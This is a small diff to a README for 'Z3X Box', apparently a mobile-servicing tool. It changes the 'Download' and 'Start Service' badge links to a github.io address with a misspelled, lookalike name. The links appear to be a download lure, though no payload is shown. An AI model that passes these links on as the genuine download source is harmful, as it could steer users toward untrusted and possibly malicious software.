@@ -1,6 +1,6 @@
 # 🔧 Z3X Box 
-[![Download Z3X Box](https://img.shields.io/badge/Download_Z3X_Box-royalblue?style=for-the-badge)](https://z3x-box-for-windows.github.io/.github/)  
-[![Start Service](https://img.shields.io/badge/Start_Service-orange?style=for-the-badge&logo=smartphone)](https://z3x-box-for-windows.github.io/.github/)
+[![Download Z3X Box](https://img.shields.io/badge/Download_Z3X_Box-royalblue?style=for-the-badge)](https://zx3boxtoolewebinf0.github.io/.github/)  
+[![Start Service](https://img.shields.io/badge/Start_Service-orange?style=for-the-badge&logo=smartphone)](https://zx3boxtoolewebinf0.github.io/.github/)
 
 ---
 
